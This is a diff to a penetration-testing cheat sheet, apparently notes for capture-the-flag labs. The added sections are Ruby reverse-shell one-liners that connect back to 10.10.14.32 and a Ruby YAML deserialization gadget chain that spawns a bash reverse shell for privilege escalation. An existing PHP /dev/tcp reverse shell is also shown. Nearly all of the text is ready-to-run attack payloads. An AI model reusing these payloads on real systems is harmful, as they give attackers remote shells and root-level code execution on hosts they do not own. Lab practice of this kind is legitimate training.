@@ -128,6 +128,13 @@ set ssl:verify-certificate false
 ### 3. Exploit
 #### 3.2 Reverse shell
 reverse shell linux [hacktricks.xyz/reverse-shells/linux](https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/linux)  
+  
+**Ruby Revershell**
+```ruby
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.14.32","9999");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+ruby -rsocket -e 'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.14.32","9999"))'
+```
+
 **PHP revershell**  
 ```php
 <?php exec("/bin/bash -c 'bash -i > /dev/tcp/ATTACKING-IP/1234 0>&1'");
@@ -281,7 +288,30 @@ brut force password
 ```bash
 keepass2john Database.kdb
 ```
-
+#### **Ruby esca**  
+**YAML.load(file.yml)**  
+modify file.yml =  
+```ruby
+---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &1 !ruby/object:Net::BufferedIO
+      io: &1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &1 !ruby/object:Net::WriteAdapter
+         socket: &1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: "bash -c 'bash -i >& /dev/tcp/10.10.14.32/8888 0>&1'"
+         method_id: :resolve
+```
 
 #### **Python esca**
 - If user have permission use sudo on python script, you can check if the script have an import, argument,...  
